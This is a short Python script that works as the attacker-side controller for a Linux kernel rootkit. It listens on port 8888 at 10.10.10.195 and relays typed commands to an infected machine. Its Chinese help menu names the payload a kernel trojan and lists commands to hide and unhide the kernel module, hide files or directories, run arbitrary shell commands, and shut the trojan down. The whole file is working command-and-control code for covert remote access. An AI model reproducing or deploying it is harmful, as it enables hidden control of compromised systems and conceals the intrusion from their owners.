import socket
import sys

serversocket = socket.socket(
            socket.AF_INET, socket.SOCK_STREAM)

host = socket.gethostname()

port = 8888

serversocket.bind(('10.10.10.195', port))

serversocket.listen(5)

clientsocket,addr = serversocket.accept()      

print("连接地址: %s" % str(addr))
msg = clientsocket.recv(1024)
while True:
    msg=input(">>")
    if msg == "?":
        print("usage\n")
        print("    startdebug    开启调式模式，输出调试信息，默认开启")
        print("    hideko        隐藏内核模块")
        print("    showko        显示内核模块")
        print("    hidefile      隐藏文件或目录，示例: hidefile aaa.txt")
        print("    exit          关闭内核木马")
        print("    other         执行命令")
        continue
    clientsocket.send(msg.encode('utf-8'))
    if msg == "exit":
        break
    msg = clientsocket.recv(4096)
    print(msg.decode('utf-8'))

clientsocket.close()